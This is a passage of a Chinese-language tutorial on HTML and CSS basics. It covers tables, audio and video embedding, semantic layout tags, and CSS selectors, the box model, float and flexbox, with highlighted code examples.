<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>姓名<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>年龄<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>城市<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>张三<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>28<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>北京<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>李四<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>32<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>上海<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></td></tr></table></figure>

<ul>
<li><code>&lt;th&gt;</code> 用于表头，默认是加粗且居中的。</li>
<li><code>&lt;td&gt;</code> 用于表格的每个单元格。</li>
<li><code>border=&quot;1&quot;</code> 为表格添加边框。</li>
</ul>
<hr>
<h3 id="HTML-多媒体"><a href="#HTML-多媒体" class="headerlink" title="HTML 多媒体"></a>HTML 多媒体</h3><p>HTML 支持嵌入多媒体文件如音频和视频。</p>
<h4 id="嵌入音频"><a href="#嵌入音频" class="headerlink" title="嵌入音频"></a>嵌入音频</h4><p>使用 <code>&lt;audio&gt;</code> 标签嵌入音频文件：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">controls</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;audio.mp3&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;audio/mpeg&quot;</span>&gt;</span><br>    您的浏览器不支持音频标签。<br><span class="hljs-tag">&lt;/<span class="hljs-name">audio</span>&gt;</span><br></code></pre></td></tr></table></figure>

<ul>
<li><code>controls</code> 属性为音频播放器添加播放控制按钮。</li>
</ul>
<h4 id="嵌入视频"><a href="#嵌入视频" class="headerlink" title="嵌入视频"></a>嵌入视频</h4><p>使用 <code>&lt;video&gt;</code> 标签嵌入视频文件：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;320&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;240&quot;</span> <span class="hljs-attr">controls</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;video.mp4&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/mp4&quot;</span>&gt;</span><br>    您的浏览器不支持视频标签。<br><span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span><br></code></pre></td></tr></table></figure>

<ul>
<li><code>width</code> 和 <code>height</code> 设置视频的显示尺寸。</li>
</ul>
<hr>
<h3 id="HTML-基本布局"><a href="#HTML-基本布局" class="headerlink" title="HTML 基本布局"></a>HTML 基本布局</h3><p>在网页布局中，可以使用 HTML 的块级元素和行内元素</p>
<p>来设计结构。常用的布局元素包括：</p>
<ul>
<li><strong>块级元素</strong>：<code>&lt;div&gt;</code>、<code>&lt;header&gt;</code>、<code>&lt;footer&gt;</code>、<code>&lt;section&gt;</code>、<code>&lt;article&gt;</code> 等，默认独占一行。</li>
<li><strong>行内元素</strong>：<code>&lt;span&gt;</code>、<code>&lt;a&gt;</code>、<code>&lt;img&gt;</code> 等，默认不会换行。</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>网站标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span>首页<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> |<br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/about&quot;</span>&gt;</span>关于<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> |<br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/contact&quot;</span>&gt;</span>联系我们<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>主要内容区域<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这里是文章内容。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-symbol">&amp;copy;</span> 2024 网站版权所有<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure>

<ul>
<li><code>&lt;header&gt;</code> 用于页面头部。</li>
<li><code>&lt;nav&gt;</code> 用于导航栏。</li>
<li><code>&lt;section&gt;</code> 表示页面中的一个内容块。</li>
<li><code>&lt;footer&gt;</code> 用于页面底部。</li>
</ul>
<hr>
<h3 id="CSS-详尽入门与指南"><a href="#CSS-详尽入门与指南" class="headerlink" title="CSS 详尽入门与指南"></a>CSS 详尽入门与指南</h3><p><strong>CSS（Cascading Style Sheets，层叠样式表）</strong> 是用来描述 HTML 元素如何在屏幕上展示的样式语言。通过使用 CSS，你可以控制网页的布局、颜色、字体、对齐方式、动画等。CSS 是构建美观、现代网页的核心技术之一，结合 HTML 使用，可以创建出复杂且灵活的网页样式</p>
<hr>
<h3 id="目录-5"><a href="#目录-5" class="headerlink" title="目录"></a>目录</h3><ol>
<li><a href="#css-%E5%9F%BA%E7%A1%80">CSS 基础</a><ul>
<li><a href="#%E5%BC%95%E5%85%A5-css">引入 CSS</a></li>
<li><a href="#css-%E8%AF%AD%E6%B3%95">CSS 语法</a></li>
</ul>
</li>
<li><a href="#%E9%80%89%E6%8B%A9%E5%99%A8%E8%AF%A6%E8%A7%A3">选择器详解</a><ul>
<li><a href="#%E9%80%9A%E7%94%A8%E9%80%89%E6%8B%A9%E5%99%A8">通用选择器</a></li>
<li><a href="#%E5%85%83%E7%B4%A0%E9%80%89%E6%8B%A9%E5%99%A8">元素选择器</a></li>
<li><a href="#%E7%B1%BB%E9%80%89%E6%8B%A9%E5%99%A8">类选择器</a></li>
<li><a href="#id-%E9%80%89%E6%8B%A9%E5%99%A8">ID 选择器</a></li>
<li><a href="#%E5%B1%9E%E6%80%A7%E9%80%89%E6%8B%A9%E5%99%A8">属性选择器</a></li>
<li><a href="#%E4%BC%AA%E7%B1%BB%E9%80%89%E6%8B%A9%E5%99%A8">伪类选择器</a></li>
<li><a href="#%E4%BC%AA%E5%85%83%E7%B4%A0%E9%80%89%E6%8B%A9%E5%99%A8">伪元素选择器</a></li>
</ul>
</li>
<li><a href="#css-%E7%9B%92%E6%A8%A1%E5%9E%8B">CSS 盒模型</a><ul>
<li><a href="#%E7%9B%92%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D">盒模型介绍</a></li>
<li><a href="#%E8%BE%B9%E8%B7%9Dmargin">边距（Margin）</a></li>
<li><a href="#%E5%A1%AB%E5%85%85padding">填充（Padding）</a></li>
<li><a href="#%E8%BE%B9%E6%A1%86border">边框（Border）</a></li>
<li><a href="#%E5%86%85%E5%AE%B9%E5%8C%BA%E5%9F%9F">内容区域</a></li>
</ul>
</li>
<li><a href="#css-%E5%B8%83%E5%B1%80">CSS 布局</a><ul>
<li><a href="#%E5%9D%97%E7%BA%A7%E5%85%83%E7%B4%A0%E4%B8%8E%E8%A1%8C%E5%86%85%E5%85%83%E7%B4%A0">块级元素与行内元素</a></li>
<li><a href="#%E6%B5%AE%E5%8A%A8%E5%B8%83%E5%B1%80float">浮动布局（Float）</a></li>
<li><a href="#%E5%BC%B9%E6%80%A7%E7%9B%92%E6%A8%A1%E5%9E%8Bflexbox">弹性盒模型（Flexbox）</a></li>
<li><a href="#%E7%BD%91%E6%A0%BC%E5%B8%83%E5%B1%80grid">网格布局（Grid）</a></li>
</ul>
</li>
<li><a href="#%E5%B8%B8%E8%A7%81-css-%E5%B1%9E%E6%80%A7">常见 CSS 属性</a><ul>
<li><a href="#%E6%96%87%E6%9C%AC%E6%A0%B7%E5%BC%8F">文本样式</a></li>
<li><a href="#%E8%83%8C%E6%99%AF%E6%A0%B7%E5%BC%8F">背景样式</a></li>
<li><a href="#%E6%98%BE%E7%A4%BA%E4%B8%8E%E5%8F%AF%E8%A7%81%E6%80%A7">显示与可见性</a></li>
</ul>
</li>
<li><a href="#css-%E5%8A%A8%E7%94%BB%E4%B8%8E%E8%BF%87%E6%B8%A1">CSS 动画与过渡</a></li>
<li><a href="#%E5%93%8D%E5%BA%94%E5%BC%8F%E8%AE%BE%E8%AE%A1">响应式设计</a><ul>
<li><a href="#%E5%AA%92%E4%BD%93%E6%9F%A5%E8%AF%A2">媒体查询</a></li>
</ul>
</li>
<li><a href="#css-%E4%BC%98%E5%8C%96%E6%8A%80%E5%B7%A7">CSS 优化技巧</a></li>
</ol>
<hr>
<h3 id="CSS-基础"><a href="#CSS-基础" class="headerlink" title="CSS 基础"></a>CSS 基础</h3><h4 id="引入-CSS"><a href="#引入-CSS" class="headerlink" title="引入 CSS"></a>引入 CSS</h4><p>在 HTML 中，你可以通过多种方式引入 CSS，最常用的有以下三种方式：</p>
<ol>
<li><strong>内联样式</strong>：在 HTML 元素的 <code>style</code> 属性中直接定义样式。</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: red;&quot;</span>&gt;</span>这是红色的文字<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure>

<ol start="2">
<li><strong>内部样式表</strong>：将 CSS 写在 HTML 文件的 <code>&lt;style&gt;</code> 标签内，位于 <code>&lt;head&gt;</code> 部分。</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">p</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">color</span>: blue;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br></code></pre></td></tr></table></figure>

<ol start="3">
<li><strong>外部样式表</strong>：将 CSS 样式写在独立的 <code>.css</code> 文件中，然后通过 <code>&lt;link&gt;</code> 标签引入。</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;styles.css&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><strong>推荐使用外部样式表</strong>，因为它可以将样式与内容分离，方便管理和维护。</p>
<hr>
<h4 id="CSS-语法"><a href="#CSS-语法" class="headerlink" title="CSS 语法"></a>CSS 语法</h4><p>CSS 的基本语法由 <strong>选择器</strong> 和 <strong>声明块</strong> 组成。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">选择器 &#123;<br>    属性: 值;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>例子</strong>：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">color</span>: green;<br>    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li><strong>选择器（Selector）</strong>：指定需要应用样式的 HTML 元素。</li>
<li><strong>属性（Property）</strong>：定义要改变的样式属性，如颜色、字体大小等。</li>
<li><strong>值（Value）</strong>：为属性提供具体的样式值。</li>
</ul>
<hr>
<h3 id="选择器详解"><a href="#选择器详解" class="headerlink" title="选择器详解"></a>选择器详解</h3><p>CSS 提供了多种选择器，用于选择 HTML 文档中的元素。通过选择器，你可以精确控制哪些元素应用特定的样式。</p>
<h4 id="通用选择器"><a href="#通用选择器" class="headerlink" title="通用选择器"></a>通用选择器</h4><p>通用选择器 <code>*</code> 用于选择所有元素。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">* &#123;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="元素选择器"><a href="#元素选择器" class="headerlink" title="元素选择器"></a>元素选择器</h4><p>元素选择器直接选择 HTML 标签中的元素。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">color</span>: black;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>以上代码将所有 <code>&lt;p&gt;</code> 元素的文本颜色设为黑色。</p>
<h4 id="类选择器"><a href="#类选择器" class="headerlink" title="类选择器"></a>类选择器</h4><p>类选择器通过元素的 <code>class</code> 属性来选择特定的元素，使用 <code>.</code> 符号。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.myclass</span> &#123;<br>    <span class="hljs-attribute">color</span>: blue;<br>    <span class="hljs-attribute">font-weight</span>: bold;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>HTML：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;myclass&quot;</span>&gt;</span>这是一个带类名的段落<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="ID-选择器"><a href="#ID-选择器" class="headerlink" title="ID 选择器"></a>ID 选择器</h4><p>ID 选择器通过元素的 <code>id</code> 属性选择，使用 <code>#</code> 符号。ID 选择器的优先级比类选择器高，但在页面中每个 ID 只能使用一次。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-id">#header</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: lightgrey;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>HTML：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;header&quot;</span>&gt;</span>这是一个头部区域<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="属性选择器"><a href="#属性选择器" class="headerlink" title="属性选择器"></a>属性选择器</h4><p>属性选择器根据 HTML 元素的属性值进行选择。语法如下：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">&quot;text&quot;</span>]</span> &#123;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#000</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>该选择器会为所有 <code>type=&quot;text&quot;</code> 的 <code>input</code> 元素应用样式。</p>
<h4 id="伪类选择器"><a href="#伪类选择器" class="headerlink" title="伪类选择器"></a>伪类选择器</h4><p>伪类选择器用于选择元素的特定状态，例如当元素被悬停、点击或聚焦时。</p>
<ul>
<li>**<code>:hover</code>**：鼠标悬停时应用样式。</li>
<li>**<code>:focus</code>**：元素获得焦点时应用样式。</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>&#125;<br><br><span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:focus</span> &#123;<br>    <span class="hljs-attribute">border-color</span>: blue;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="伪元素选择器"><a href="#伪元素选择器" class="headerlink" title="伪元素选择器"></a>伪元素选择器</h4><p>伪元素选择器用于选择元素的一部分，例如文本的第一个字母或行。</p>
<ul>
<li>**<code>::before</code>**：在元素内容之前插入内容。</li>
<li>**<code>::after</code>**：在元素内容之后插入内容。</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span><span class="hljs-selector-pseudo">::before</span> &#123;<br>    <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;🌟 &quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>该代码会在所有 <code>&lt;h1&gt;</code> 元素前插入一个星星符号。</p>
<hr>
<h3 id="CSS-盒模型"><a href="#CSS-盒模型" class="headerlink" title="CSS 盒模型"></a>CSS 盒模型</h3><h4 id="盒模型介绍"><a href="#盒模型介绍" class="headerlink" title="盒模型介绍"></a>盒模型介绍</h4><p>CSS 中的每个元素都可以被看作一个盒子，CSS 盒模型描述了盒子的组成部分。盒模型包含以下四个部分：</p>
<ol>
<li><strong>内容（Content）</strong>：显示文本或图像的实际区域。</li>
<li><strong>填充（Padding）</strong>：内容周围的空白区域。</li>
<li><strong>边框（Border）</strong>：环绕填充和内容的边界。</li>
<li><strong>边距（Margin）</strong>：元素与其他元素之间的距离。</li>
</ol>
<p>盒模型图解：</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----------------------+</span><br><span class="hljs-section">|      Margin           |</span><br><span class="hljs-section">+----------------------+</span><br><span class="hljs-section">|      Border           |</span><br><span class="hljs-section">+----------------------+</span><br><span class="hljs-section">|      Padding          |</span><br><span class="hljs-section">+----------------------+</span><br><span class="hljs-section">|      Content          |</span><br><span class="hljs-section">+----------------------+</span><br></code></pre></td></tr></table></figure>

<h4 id="边距（Margin）"><a href="#边距（Margin）" class="headerlink" title="边距（Margin）"></a>边距（Margin）</h4><p><code>margin</code> 用于设置元素与其他元素之间的外部间距。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>你还可以分别为上下左右边距设置不同的值：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">10px</span>;<br>    <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">15px</span>;<br>    <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;<br>    <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">25px</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="填充（Padding）"><a href="#填充（Padding）" class="headerlink" title="填充（Padding）"></a>填充（Padding）</h4><p><code>padding</code> 用于设置内容与边框之间的内部填充空间。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>同样可以分别设置四个方向的填充：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span> <span class="hljs-number">15px</span> <span class="hljs-number">20px</span> <span class="hljs-number">25px</span>;  <span class="hljs-comment">/* 上，右，下，左 */</span><br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="边框（Border）"><a href="#边框（Border）" class="headerlink" title="边框（Border）"></a>边框（Border）</h4><p><code>border</code> 用于设置元素的边框。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid black;<br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li>边框的厚度、样式和颜色可以通过 <code>border-width</code>, <code>border-style</code>, <code>border-color</code> 进行单独设置。</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">border-width</span>: <span class="hljs-number">2px</span>;<br>    <span class="hljs-attribute">border-style</span>: dashed;<br>    <span class="hljs-attribute">border-color</span>: red;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="CSS-布局"><a href="#CSS-布局" class="headerlink" title="CSS 布局"></a>CSS 布局</h3><h4 id="块级元素与行内元素"><a href="#块级元素与行内元素" class="headerlink" title="块级元素与行内元素"></a>块级元素与行内元素</h4><ul>
<li><strong>块级元素</strong>（如 <code>&lt;div&gt;</code>, <code>&lt;p&gt;</code>）：占据一整行，多个块级元素会自动换行。</li>
<li><strong>行内元素</strong>（如 <code>&lt;span&gt;</code>, <code>&lt;a&gt;</code>）：只占据内容的宽度，多个行内元素会排在一行中。</li>
</ul>
<h4 id="浮动布局（Float）"><a href="#浮动布局（Float）" class="headerlink" title="浮动布局（Float）"></a>浮动布局（Float）</h4><p><code>float</code> 属性用于让元素左右浮动，从而实现简单的布局。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">float</span>: left;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">10px</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>多个浮动元素可以左右排列，浮动布局常用于图片排版和简单的列布局。</p>
<h4 id="弹性盒模型（Flexbox）"><a href="#弹性盒模型（Flexbox）" class="headerlink" title="弹性盒模型（Flexbox）"></a>弹性盒模型（Flexbox）</h4><p>&#96;flexbox</p>
<p>&#96; 是现代布局的强大工具，用于创建灵活的响应式布局。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">display</span>: flex;<br>    <span class="hljs-attribute">justify-content</span>: space-between; <span class="hljs-comment">/* 主轴对齐方式 */</span><br>    <span class="hljs-attribute">align-items</span>: center;  <span class="hljs-comment">/* 交叉轴对齐方式 */</span><br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li><code>display: flex</code> 将容器设为弹性盒容器。</li>
<li><code>justify-content</code> 和 <code>align-items</code> 控制子元素在主轴和交叉轴上的对齐方式。</li>
</ul>
<h4 id="网格布局（Grid）"><a href="#网格布局（Grid）" class="headerlink" title="网格布局（Grid）"></a>网格布局（Grid）</h4><p><code>grid</code> 是另一个用于复杂布局的 CSS 工具，允许你创建二维的网格布局。</p>
